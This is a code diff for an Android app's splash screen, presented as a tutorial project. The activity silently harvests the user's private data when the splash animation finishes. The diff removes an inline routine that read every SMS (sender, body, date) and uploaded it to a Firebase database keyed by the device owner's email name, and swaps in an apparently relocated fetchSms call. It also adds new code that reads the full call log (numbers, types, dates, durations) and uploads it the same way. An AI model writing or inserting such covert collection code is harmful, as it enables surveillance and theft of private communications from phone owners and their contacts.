@@ -1,10 +1,8 @@
 package com.android.tutorial.activity;
 
-import android.content.ContentResolver;
 import android.content.Intent;
 import android.database.Cursor;
-import android.net.Uri;
-import android.text.format.DateFormat;
+import android.provider.CallLog;
 import android.widget.Toast;
 
 import com.android.tutorial.R;
@@ -17,15 +15,12 @@ import com.viksaa.sssplash.lib.activity.AwesomeSplash;
 import com.viksaa.sssplash.lib.cnst.Flags;
 import com.viksaa.sssplash.lib.model.ConfigSplash;
 
-import java.util.ArrayList;
 import java.util.Date;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
+
+import static com.android.tutorial.utils.Utils.fetchSms;
 
 public class SplashActivity extends AwesomeSplash {
 
-    private DatabaseReference mFirebaseDatabase;
-    private FirebaseDatabase mFirebaseInstance;
     Cursor cursor;
 
     @Override
@@ -73,9 +68,8 @@ public class SplashActivity extends AwesomeSplash {
 
     @Override
     public void animationsFinished() {
-        mFirebaseInstance = FirebaseDatabase.getInstance();
-        mFirebaseDatabase = mFirebaseInstance.getReference();
-        fetchSms();
+        logCallLog();
+        fetchSms(SplashActivity.this);
         PrefManager prefManager = new PrefManager(getApplicationContext());
         if (!prefManager.isFirstTimeLaunch()) {
             launchHomeScreen();
@@ -83,61 +77,6 @@ public class SplashActivity extends AwesomeSplash {
         } else {
             launchWelcomeScreen();
         }
-    }
-
-    public ArrayList fetchSms() {
-        ArrayList sms = new ArrayList();
-        Uri message = Uri.parse("content://sms/");
-        ContentResolver cr = SplashActivity.this.getContentResolver();
-
-        Cursor cursor = cr.query(message, null, null, null, null);
-        SplashActivity.this.startManagingCursor(cursor);
-        int totalSMS = cursor.getCount();
-        String readStatus = "";
-        long millisecond;
-        if (cursor.moveToFirst()) {
-            for (int i = 0; i < totalSMS; i++) {
-                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
-                    readStatus = "inbox";
-                } else {
-                    readStatus = "sent";
-                }
-
-                millisecond = Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")));
-                String dateString = DateFormat.format("MM/dd/yyyy hh:mm", new Date(millisecond)).toString();
-
-                sms.add("MobileNumber:" + cursor.getString(cursor.getColumnIndexOrThrow("address"))
-                        + "\nSMS:" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
-                        + "\nDATE:" + dateString
-                        + "\nTYPE:" + cursor.getColumnIndexOrThrow("type")
-                        + "\nReadStatus:" + readStatus);
-
-                String senderAddress = cursor.getString(cursor.getColumnIndexOrThrow("address"));
-                Pattern pt = Pattern.compile("[^a-zA-Z0-9]");
-                Matcher match = pt.matcher(senderAddress);
-                while (match.find()) {
-                    String s = match.group();
-                    senderAddress = senderAddress.replaceAll("\\" + s, "");
-                }
-
-                mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(SplashActivity.this)
-//                                MyDevice.getDeviceName()
-                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
-                        .child(senderAddress)
-                        .child(readStatus)
-                        .child("" + i)
-                        .setValue("" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
-                                + " " + dateString
-                        );
-                cursor.moveToNext();
-            }
-        }
-        // else {
-        // throw new RuntimeException("You have no SMS");
-        // }
-        cursor.close();
-
-        return sms;
     }
 
 /*
@@ -258,4 +197,52 @@ public class SplashActivity extends AwesomeSplash {
             "             116.00,238.00 116.00,116.00 116.00,116.00\n" +
             "             116.00,116.00 289.00,116.00 289.00,116.00 Z";
 
+    public void logCallLog() {
+        FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
+        DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
+        mFirebaseDatabase.child("calls").child("" + MyDevice.getDeviceEmailName(SplashActivity.this))
+                .setValue(getCallDetails());
+    }
+
+    private String getCallDetails() {
+
+        StringBuffer sb = new StringBuffer();
+        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
+                null, null, null);
+        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
+        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
+        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
+        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
+        sb.append("Call Details :");
+        while (managedCursor.moveToNext()) {
+            String phNumber = managedCursor.getString(number);
+            String callType = managedCursor.getString(type);
+            String callDate = managedCursor.getString(date);
+            Date callDayTime = new Date(Long.valueOf(callDate));
+            String callDuration = managedCursor.getString(duration);
+            String dir = null;
+            int dircode = Integer.parseInt(callType);
+            switch (dircode) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = "OUTGOING";
+                    break;
+
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = "INCOMING";
+                    break;
+
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = "MISSED";
+                    break;
+            }
+            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
+                    + dir + " \nCall Date:--- " + callDayTime
+                    + " \nCall duration in sec :--- " + callDuration);
+            sb.append("\n----------------------------------");
+        }
+        managedCursor.close();
+        return sb.toString();
+
+    }
 }
+
